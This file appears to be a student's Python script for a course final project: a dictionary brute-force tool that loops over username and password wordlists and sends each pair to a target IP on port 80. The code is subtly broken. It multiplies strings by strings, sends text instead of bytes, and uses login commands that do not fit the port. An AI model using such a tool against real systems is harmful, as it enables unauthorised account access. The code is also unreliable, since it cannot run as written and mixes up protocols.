#!/usr/bin/env python3
# Script:                   401 Final Project
# Author:                   Mario Pugh
# Date of latest revision:  12/14/20
# Purpose:                  Password and Username Brute Force

# Import libaries

import socket
import os
import re
import sys

# Declaration of function

def connect(ip, user, passWord):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("IP: {} - Username: {} - Password: {}".format(ip,user,passWord))
    
    sock.connect((ip,80))

    data = sock.recv(1024)

    sock.send('User' + user * '\r\n')

    data = sock.recv(1024)

    sock.send('Password' + passWord * '\r\n')

    data = sock.recv(1024)

    sock.send('Quit' * '\r\n')
    sock.close()

    return data

file_path_username = sys.argv[1]
file_path_passwd = sys.argv[2]
ip_input = sys.argv[3]

file_usernames = open(file_path_username,mode="r")
file_passwords = open(file_path_passwd,mode="r")

dictionary_username = file_usernames.readlines()
file_usernames.close()
dictionary_passwd = file_passwords.readlines()
file_passwords.close()

for username in dictionary_username:
    for password in dictionary_passwd:
        print(connect(ip_input,username.strip(),password.strip()))

# Main

# End
